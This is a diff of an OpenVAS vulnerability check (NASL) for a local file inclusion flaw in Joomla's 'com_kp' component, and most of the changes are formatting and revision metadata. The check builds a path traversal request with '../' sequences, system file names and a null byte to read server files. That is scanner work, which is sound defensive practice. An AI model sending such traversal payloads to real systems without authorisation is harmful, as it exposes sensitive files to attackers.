@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_joomla_51623.nasl 10704 2018-08-01 10:06:44Z ckuersteiner $
+# $Id: gb_joomla_51623.nasl 11144 2018-08-28 11:37:19Z asteins $
 #
 # Joomla! 'com_kp' Component 'controller' Parameter Local File Include Vulnerability
 #
@@ -29,30 +29,30 @@ CPE = "cpe:/a:joomla:joomla";
 
 if (description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.103398");
- script_bugtraq_id(51623);
- script_cve_id("CVE-2011-4804");
- script_tag(name:"cvss_base", value:"5.0");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
- script_version ("$Revision: 10704 $");
+  script_oid("1.3.6.1.4.1.25623.1.0.103398");
+  script_bugtraq_id(51623);
+  script_cve_id("CVE-2011-4804");
+  script_tag(name:"cvss_base", value:"5.0");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
+  script_version("$Revision: 11144 $");
 
- script_tag(name: "solution_type", value: "VendorFix");
+  script_tag(name:"solution_type", value:"VendorFix");
 
- script_name("Joomla! 'com_kp' Component 'controller' Parameter Local File Include Vulnerability");
+  script_name("Joomla! 'com_kp' Component 'controller' Parameter Local File Include Vulnerability");
 
- script_xref(name: "URL", value: "http://www.securityfocus.com/bid/51623");
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51623");
 
- script_tag(name:"last_modification", value:"$Date: 2018-08-01 12:06:44 +0200 (Wed, 01 Aug 2018) $");
- script_tag(name:"creation_date", value:"2012-01-24 10:42:33 +0100 (Tue, 24 Jan 2012)");
- script_category(ACT_ATTACK);
- script_tag(name:"qod_type", value:"remote_vul");
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
- script_dependencies("joomla_detect.nasl", "os_detection.nasl");
- script_require_ports("Services/www", 80);
- script_mandatory_keys("joomla/installed");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-28 13:37:19 +0200 (Tue, 28 Aug 2018) $");
+  script_tag(name:"creation_date", value:"2012-01-24 10:42:33 +0100 (Tue, 24 Jan 2012)");
+  script_category(ACT_ATTACK);
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
+  script_dependencies("joomla_detect.nasl", "os_detection.nasl");
+  script_require_ports("Services/www", 80);
+  script_mandatory_keys("joomla/installed");
 
- script_tag(name: "summary", value: "The 'com_kp' component for Joomla! is prone to a local file-include
+  script_tag(name:"summary", value:"The 'com_kp' component for Joomla! is prone to a local file-include
 vulnerability because it fails to properly sanitize user-supplied input.
 
 An attacker can exploit this vulnerability to obtain potentially sensitive information and execute arbitrary local
@@ -66,7 +66,7 @@ include("misc_func.inc");
 include("http_func.inc");
 include("host_details.inc");
 include("http_keepalive.inc");
-   
+
 if (!port = get_app_port(cpe:CPE))
   exit(0);
 
@@ -79,7 +79,7 @@ if (dir == "/")
 files = traversal_files();
 
 foreach file (keys(files)) {
-  url = dir + "/index.php?option=com_kp&controller=" + crap(data:"../",length:6*9) + files[file] + "%00"; 
+  url = dir + "/index.php?option=com_kp&controller=" + crap(data:"../",length:6*9) + files[file] + "%00";
 
   if (http_vuln_check(port: port, url: url, pattern: file)) {
     report = report_vuln_url(port: port, url: url);
